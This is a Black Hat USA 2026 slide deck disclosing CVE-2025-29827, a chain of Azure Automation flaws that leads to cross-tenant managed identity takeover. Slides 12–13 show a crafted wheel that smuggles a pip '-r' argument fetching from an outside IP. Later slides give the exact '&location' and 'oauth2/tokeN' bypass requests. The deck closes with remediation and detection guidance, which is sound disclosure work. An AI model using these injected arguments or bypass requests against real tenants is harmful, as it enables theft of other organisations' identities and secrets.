---
title: "Handle With Care Chaining Azure Automation Flaws for Cross-Tenant Identity Takeover"
speakers: ["Shay Shavit"]
conference: "Black Hat"
conference_full: "Black Hat USA 2026"
edition: "USA"
year: 2026
source_pdf: "BlackHat_USA_2026_Slides/Shay Shavit_Handle With Care Chaining Azure Automation Flaws for Cross-Tenant Identity Takeover.pdf"
pages: 50
sha256: "02c2912eeb1b9339611cae9ce233c513e2a8150b50d755583cd1f7e5be3ec953"
text_chars: 17072
ocr_pages: 3
has_ocr: true
redacted_secrets: 0
ocr_confidence: 89.2
ocr_unreliable_blocks: 0
vision_verified_pages_changed: 50
vision_verified_pages: 50
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T05:43:27Z"
---
# Handle With Care Chaining Azure Automation Flaws for Cross-Tenant Identity Takeover

**Speakers:** Shay Shavit  
**Conference:** Black Hat USA 2026  
**Source:** `BlackHat_USA_2026_Slides/Shay Shavit_Handle With Care Chaining Azure Automation Flaws for Cross-Tenant Identity Takeover.pdf` (50 pages)


## Slide 1

###### Handle With Care: Chaining Azure Automation Flaws for Cross-Tenant Identity Takeover

Shay Shavit

## Slide 2

###### WHOAMI

**Shay Shavit**
Senior Security Researcher
Microsoft

## Slide 3

## AGENDA

**Azure Automation 101**

**Methodology: what didn’t work, and why it matters**

**Chaining the Flaws (CVE-2025-29827)**

**Impact & Takeaways**

## Slide 4

## AZURE AUTOMATION

**01 Runbook** PowerShell / Python automation code

**02 Job** Scheduled or triggered execution instance

**03 Worker** Cloud sandbox or hybrid worker

**04 Managed Identity** Access token for Azure services

**05 Azure Resources** Compute • Storage • Key Vault • APIs

## Slide 5

###### WHY AZURE AUTOMATION

**Broadly Used**
Across Customers and internally

**Runs Code**
PowerShell / Python

**Stores Secrets**
Secrets / Certificates

**Privileged Identity**
Owner / Contributor / KeyVault Administrator

## Slide 6

### OUR GOAL

###### Cross-Tenant Access

## Slide 7

###### HOW ANSR HUNTS CHAINS

**METHODOLOGY — FOLLOW THE ASSUMPTIONS ACROSS BOUNDARIES**

**01 Enumerate trust boundaries**

Every place identity, tenancy, or authorization changes hands.

**02 Chain the gaps**

A single bypass is rarely enough; combine primitives across boundaries.

**03 Validate the fix at every link**

One patch is never the fix; the assumption at every link has to change.

**The rest of this talk is this methodology, applied to Azure Automation.**

## Slide 8

## WHAT DIDN’T CHAIN

2 SSRFs

RCE (sandboxed)

## Slide 9

###### PYTHON PACKAGE RCE

- You can upload python packages to your automation account.
- Upload processed in shared environment.
- Only whl files allowed -> no dynamic code
- Let’s start digging

## Slide 10

###### PYTHON PACKAGE UPLOAD

**01 User Uploads Whl Package**

**02 Package Validation**
Shared service environment

**03 Automation Account Package Store**

_The validation step is where untrusted package input crosses into service-controlled execution._

## Slide 11

###### WHAT HAPPENS INSIDE VALIDATION

**01 Extract Archive**

**02 Read Wheel Metadata**
Trust boundary crossing

**03 Invoke pip Command**

_The risky moment is when archive-controlled metadata begins shaping service-side validation._

## Slide 12

###### PYTHON PACKAGE RCE

```
var pip = $"install --root {tempExtractionPath} --ignore-installed
--no-deps --ignore-requires-python {wheelFilePath}";
```

Archive path of the malicious wheel:

`test.whl\.-..\..\..\..\..\..\..\Python27\Tools\Scripts\.dist-info\`

| Name | Size | Packed Size | Modified | Created | Accessed | Attributes |
|------|------|-------------|----------|---------|----------|------------|
| METADATA | 220 | 152 | 2024-11-18 17:31 | 2024-11-18 17:10 | 2024-11-18 17:31 | A |
| RECORD | 387 | 256 | 2024-10-31 10:55 | 2024-11-18 17:10 | 2024-11-18 17:10 | A |
| top_level.txt | 13 | 13 | 2024-10-31 10:55 | 2024-11-18 17:10 | 2024-11-18 17:15 | A |
| WHEEL | 117 | 111 | 2024-11-17 17:52 | 2024-11-18 17:10 | 2024-11-18 17:24 | A |

WHEEL file contents:

```
Wheel-Version: 1.0
Generator: bdist_wheel (0.37.1)
Root-Is-Purelib: true
Tag: r http://172.171.240.248/../../l -f-any
```

## Slide 13

###### PYTHON PACKAGE RCE

```
pip.exe install --root C:/temp/jfdsa9rvfsd/ --ignore-installed --no-
deps --ignore-requires-python
C:/temp/jfdsa9rvfsd/../../../../../../../Python27/Tools/Scripts/
-r http://172.171.240.248/../../l -f-any
```

**Install This** (highlights the install path `C:/temp/jfdsa9rvfsd/../…/Python27/Tools/Scripts/`)

**Requires This** (highlights `-r http://172.171.240.248/../../l`)

## Slide 14

## SANDBOX

We can execute code in a sandbox

The sandbox can fetch Account MI token

We can trick it to ask for another account MI

## Slide 15

## IT DIDN’T WORK

```
[473660]: (283) 12/24/2024 9:50:49 AM : TraceExceptionWarning : An exception prevented … service request: … . [sandboxId=583af5e0-…
System.UnauthorizedAccessException: The sandbox 583af5e0-…a attempted to access the account c74…5d.
```

**_Methodology signal:_** _when a bug doesn't chain, ask what boundary you actually need to cross_

## Slide 16

## BUT WE LEARNED

Automation Service has a way to fetch MI for all automation accounts

Can we find another vector?

## Slide 17

## HYBRID WORKERS

Automation gives you the ability to run notebooks on Azure enabled hosts.

ARC enabled on-prem hosts.

Install a vm extension, register as a worker in the account and fetch data from the account including MI token.

Hosts communicate with a separate endpoint to enable functionality  = JRDS

## Slide 18

###### JOB RUNTIME DATA SERVICE

New plan!

We find vulnerabilities in JRDS

## Slide 19

###### JRDS ENDPOINTS

`https://{accountId}.jrds.azure-automation.net`

**Per-account endpoint**
Each Automation Account has its own JRDS hostname.

**Public by default**
Network access was allowed from the internet unless restricted.

**Security implication**
The authentication path became remotely reachable.

## Slide 20

###### AUTH HANDLERS

```
HttpMessageHandler.Add(new CertificateHandler(container.Resolve<...
HttpMessageHandler.Add(new JwtHandler(container.Resolve<...
HttpMessageHandler.Add(new MIHandler(container.Resolve<…
```

**Handlers are sequential, if one fails the other try to authenticate**

## Slide 21

###### THREE GATES

Hybrid Worker VM → JRDS request → JWT Authentication Handler → Route Handler

**Inside the JWT Authentication Handler**

1. **Validate JWT** — Is the token valid?
2. **Bind identity to VM** — Does the token match the VM?
3. **Fetch worker info** — Is this worker associated with this Automation Account?

_Each gate answers a different question._

## Slide 22

###### GATE 1: VALIDATE JWT

JWT
Managed identity token

**JWT Authentication Handler**

1. Validate JWT
2. Bind identity to VM
3. Fetch worker info

**Requirement:** present a valid managed identity JWT

This proves the caller has **_some_** managed identity — not that it belongs to the target Automation Account.

**Gate 1 verifies token validity, not account association.**

## Slide 23

###### GATE 2: BIND IDENTITY TO VM

**JWT Authentication Handler**

✓ Validate JWT — PASSED
2. Bind identity to VM
3. Fetch worker info

**REQUEST PARAMETER**
`?vmResourceId={vm-controlled-by-caller}`

The handler checks whether the JWT identity matches the VM resource ID in the request.

**Key insight** But the request supplies the VM resource ID.

JWT managed identity == vmResourceId identity
Result: PASS

**Gate 2 binds the token to the VM named by the request — not yet to the Automation Account.**

## Slide 24

###### LOCATION LOCATION LOCATION

```
if (!IsLocation(request)){
    AssociateWorker();
}
```

```
private bool IsLocation(HttpRequestMessage request)
{
    return request.RequestUri.AbsoluteUri.Contains(“location”);
}
```

Fetch association info only if **not** location request

## Slide 25

###### LOCATION LOCATION LOCATION

We skip associate for /location requests

So it checks AbsolutePath, right?

AbsoluteUri.Contains("/location")

...It checks AbsolutePath, right?

## Slide 26

###### LOCATION LOCATION LOCATION

```
if (!IsLocation(request)){
    AssociateWorker();
}
```

```
private bool IsLocation(HttpRequestMessage request)
{
    return request.RequestUri.AbsoluteUri.Contains(“location”);
}
```

Fetch association info only if **not** location request

AbsoluteUri includes query parameters...
Appending &locations bypass the association check.

## Slide 27

###### GATE 3: FETCH WORKER INFO

**JWT Authentication Handler**

✓ Validate JWT — PASSED
✓ Bind identity to VM — PASSED
3. Fetch worker info — Worker must be associated with requested Automation Account — BYPASSED

**GATE 3 EFFECTIVE RESULT**

~~Association check~~ → BYPASSED

```
GET /automationAccounts/{targetAccount}/action?&location
```

## Slide 28

###### BYPASS SUMMARY

**1 Valid JWT** — Any managed identity token

**2 Matching vmResourceId** — Request-controlled VM reference

**3 Worker lookup bypass** — Association check skipped via query manipulation

**! Request reaches Route Handler** — Unauthorized path

The first two gates validate identity shape; the third gate was supposed to enforce **Automation Account scope.**

```
GET /automationAccounts/{targetAccount}/action?vmResourceId={vm}&location
```

## Slide 29

###### WHAT THE BYPASS EXPOSED

Once the association check is **bypassed**, the attacker can **access everything below**.

**Certificates**
signing material, auth material, service credentials

**Secrets**
stored automation secrets and protected values

**Notebook content**
automation logic, scripts, operational context

**Job results**
execution output, errors, environment details

## Slide 30

###### MANAGED IDENTITY TIME

- Automation account create a managed identity on RP registration; all accounts have a managed identity.
- This is the secure way for automation to perform its defined tasks.
- Notebook fetch MI token -> perform actions on Azure tenant.
- Most of the time the MI have a very privileged role: Contributor, Owner, etc..

## Slide 31

###### LOCATION?

- I Have authorization bypass -> fetch MI token
- token is generated by
   - GET /automationAccounts/{accountID}/oauth2/token
   - No association check
- Issued request -> got 403 Forbidden
- Why?

## Slide 32

###### DIFFERENT AUTH HANDLER

```
HttpMessageHandler.Add(new CertificateHandler(container.Resolve<...
HttpMessageHandler.Add(new JwtHandler(container.Resolve<...
HttpMessageHandler.Add(new MIHandler(container.Resolve<…
```

**Another handler authorize MI tokens**

## Slide 33

###### ISMIREQUEST()

```
if (IsMIRequest(request.uri))
{
    // Skip Auth Token based authentication
    return base.Send(request);
}
```

```
public static bool IsMIRequest(Uri uri)
{
    string guid = @”…”;
    Regex regex = new Regex($"/automationAccounts/{guid}/oauth2/token");
    Match match = regex.Match(uri.AbsolutePath);
    return match.Success;
}
```

From JwtHandler

## Slide 34

## MI HANDLER

- Requires a per account secret present in automation account
- Don’t have the secret
- Couldn’t obtain the secret
   - Isn’t stored in the automation account “secrets” accessible via the previous &location chain
- Couldn’t bypass the handler logic

## Slide 35

## MI HANDLER

**But “Handlers are sequential, if one fails the next try to authenticate”**

JWTHalder executes before MIHandler.
We can bypass JWT.
Can we force the use of JWTHandler?

## Slide 36

###### ISMIREQUEST()

```
if (IsMIRequest(request.uri))
{
    // We Skip Auth Token based authentication
    return base.Send(request);
}
```

```
public static bool IsMIRequest(Uri uri)
{
    string guid = @”…”;
    Regex regex = new Regex($"/automationAccounts/{guid}/oauth2/token");
    Match match = regex.Match(uri.AbsolutePath);
    return match.Success;
}
```

From JwtHandler

## Slide 37

###### ONE CHARACTER. OPPOSITE OUTCOME.

**THE LAST CHARACTER CHANGES THE AUTH PATH**

**LOWERCASE** n  ≠  **UPPERCASE** N

**CASE-SENSITIVE MATCH**

**403** `GET /automationAccounts/{accountID}/oauth2/token` **AUTH RUNS**

**200** `GET /automationAccounts/{accountID}/oauth2/tokeN` **AUTH SKIPPED**

**The endpoint is the same. The casing decides whether authentication executes.**

## Slide 38

###### SAME ENDPOINT, DIFFERENT HANDLER PATH

**/oauth2/token → 403**

- Request: /oauth2/token
- JWT Handler — Recognizes MI token route
- MI Token Handler — Requires MSI-specific auth context
- DENIED — 403

**/oauth2/tokeN → 200**

- Request: /oauth2/tokeN
- JWT Handler — JWT auth succeeds
- MI Token Handler — Skipped
- Router / Controller — Case-insensitive route match
- TOKEN ISSUED — 200

_Handler matching was case-sensitive; controller routing was not._

## Slide 39

###### CHAINING THE PIECES

**CVE-2025-29827 (CVSS 9.9)**

**THREE INGREDIENTS**

**1 BAD DEFAULT** Automation Accounts are public by default

**2 VULNERABILITY #1** &location bypasses worker association

**3 VULNERABILITY #2** tokeN reaches the token controller through handler mismatch

Chained together

**HIGH-IMPACT RESULT**

**Cross-tenant managed identity takeover**

Access to public Automation Accounts

Tokens for managed identities

Tenant resources reachable through assigned roles

## Slide 40

###### 1. LEGITIMATE STARTING POINT

**1/7**

**ATTACKER TENANT**
- Attacker Automation Account
- Attacker Hybrid Worker VM
- Attacker Managed Identity

**AZURE AUTOMATION / JRDS**
- JRDS endpoint
- JWT Authentication Handler
- Worker association check
- Token route / controller

**VICTIM TENANT**
- Victim Automation Account
- Victim Managed Identity
- Tenant resources: Key Vault, Storage, VMs, Subscriptions

The attacker starts with a legitimate Automation Account, VM, and managed identity.

## Slide 41

###### 2. PUBLIC TARGET

**2/7**

**ATTACKER TENANT**
- Attacker Automation Account
- Attacker Hybrid Worker VM
- Attacker Managed Identity

**AZURE AUTOMATION / JRDS**
- JRDS endpoint
- JWT Authentication Handler
- Worker association check
- Token route / controller

**VICTIM TENANT**
- Victim Automation Account — Automation Accounts are public by default.
- Victim Managed Identity
- Tenant resources: Key Vault, Storage, VMs, Subscriptions

Public reachability gives the attacker a path to the JRDS endpoint.

## Slide 42

###### 3. CROSS-ACCOUNT JRDS REQUEST

**3/7**

**ATTACKER TENANT**
- Attacker Automation Account
- Attacker Hybrid Worker VM
- Attacker Managed Identity

**AZURE AUTOMATION / JRDS**
- JRDS endpoint
- JWT Authentication Handler
- Worker association check
- Token route / controller

**VICTIM TENANT**
- Victim Automation Account
- Victim Managed Identity
- Tenant resources: Key Vault, Storage, VMs, Subscriptions

```
GET /automationAccounts/{victimAccount}/.../?vmResourceId={attackerVm}
```

The request targets the victim account while carrying attacker-controlled VM context.

## Slide 43

###### 4. FIRST CHECKS PASS

**4/7**

**ATTACKER TENANT**
- Attacker Automation Account
- Attacker Hybrid Worker VM
- Attacker Managed Identity

**AZURE AUTOMATION / JRDS**
- JRDS endpoint
- JWT Authentication Handler
  - ✓ Valid JWT
  - ✓ JWT identity matches vmResourceId
- Worker association check
- Token route / controller

**VICTIM TENANT**
- Victim Automation Account
- Victim Managed Identity
- Tenant resources: Key Vault, Storage, VMs, Subscriptions

```
GET /automationAccounts/{victimAccount}/.../?vmResourceId={attackerVm}
```

The first checks validate the attacker’s identity shape, not the victim account scope.

## Slide 44

###### 5. ASSOCIATION CHECK BYPASS

**5/7**

**ATTACKER TENANT**
- Attacker Automation Account
- Attacker Hybrid Worker VM
- Attacker Managed Identity

**AZURE AUTOMATION / JRDS**
- JRDS endpoint
- JWT Authentication Handler
- Worker association check — BYPASSED
- Token route / controller

**VICTIM TENANT**
- Victim Automation Account
- Victim Managed Identity
- Tenant resources: Key Vault, Storage, VMs, Subscriptions

```
GET /automationAccounts/{victimAccount}/...?vmResourceId={attackerVm}&location
```

Query manipulation bypasses the worker-to-account association check.

## Slide 45

###### 6. TOKEN ROUTE MISMATCH

**6/7**

**ATTACKER TENANT**
- Attacker Automation Account
- Attacker Hybrid Worker VM
- Attacker Managed Identity

**AZURE AUTOMATION / JRDS**
- JRDS endpoint
- JWT Authentication Handler
- Worker association check
- Token route / controller — MISMATCH

**VICTIM TENANT**
- Victim Automation Account
- Victim Managed Identity
- Tenant resources: Key Vault, Storage, VMs, Subscriptions

```
GET .../oauth2/tokeN?vmResourceId={attackerVm}&location
```

Handler matching and controller routing disagree.

The request reaches the token-generation path.

## Slide 46

###### 7. VICTIM IDENTITY OBTAINED

**7/7**

**ATTACKER TENANT**
- Attacker Automation Account
- Attacker Hybrid Worker VM
- Attacker Managed Identity

**AZURE AUTOMATION / JRDS**
- JRDS endpoint
- JWT Authentication Handler
- Worker association check
- Token route / controller

**VICTIM TENANT**
- Victim Automation Account
- **TOKEN OBTAINED** — Victim Automation Account Managed Identity
- Tenant resources: Key Vault, Storage, VMs, Subscriptions

The attacker can act through the victim Automation Account’s managed identity and its assigned roles.

## Slide 47

###### BREAKING THE CHAIN

**REMEDIATION — REMOVE THE UNSAFE ASSUMPTION AT EACH LINK**

CHAIN BROKEN

**LINK 1**
WEAK POINT: Public exposure
FIX: Guidance to enable private endpoint

**LINK 2**
WEAK POINT: Worker association
FIX: Normalize and strictly validate request parameters before lookup

**LINK 3**
WEAK POINT: Handler mismatch
FIX: Make handler routing and controller routing agree

**LINK 4**
WEAK POINT: Token issuance
FIX: Re-validate authorization at the token-generation boundary

**The fix was not one patch — it was removing every unsafe assumption in the chain.**

## Slide 48

###### DETECTING THE CHAIN IN FLIGHT

**DETECTION — CORRELATE TENANT, URI, AND WORKER ASSOCIATION**

**01 Anomalous JRDS access**

**WHAT TO LOOK FOR**
JRDS calls where the caller's tenant ≠ the target Automation Account's tenant.

**WHY IT FIRES**
Cross-tenant hybrid worker registration is not a legitimate pattern.

**02 Suspicious query shape on token endpoints**

**WHAT TO LOOK FOR**
Requests to /automationAccounts/*/oauth2/token* containing &location, mixed casing (tokenN, Token), or trailing characters.

**WHY IT FIRES**
Both bypass primitives in this chain are visible at the URI layer.

**03 Managed-identity issuance without worker association**

**WHAT TO LOOK FOR**
MI tokens issued to callers not registered as a hybrid worker for that account.

**WHY IT FIRES**
This is the takeover moment — if you catch nothing else, catch this.

**You don't need to catch the bug — you need to catch the pattern.**

## Slide 49

###### FINAL TAKEAWAYS

**WHAT TO REMEMBER WHEN YOU WALK OUT**

**Chained flaws**

1 default + 1 routing bug + 1 regex bug = cross-tenant identity takeover.

**Mitigate cross-tenant identity abuse**
Private-by-default + canonical routing + authorize at every boundary.

**A methodology for multi-tenant threat modeling**
Enumerate trust boundaries → attack each gate → chain the gaps → validate the fix at every link.

**Cloud isolation is only as strong as the assumptions between services.**

## Slide 50

#### Thank You

###### Shay Shavit

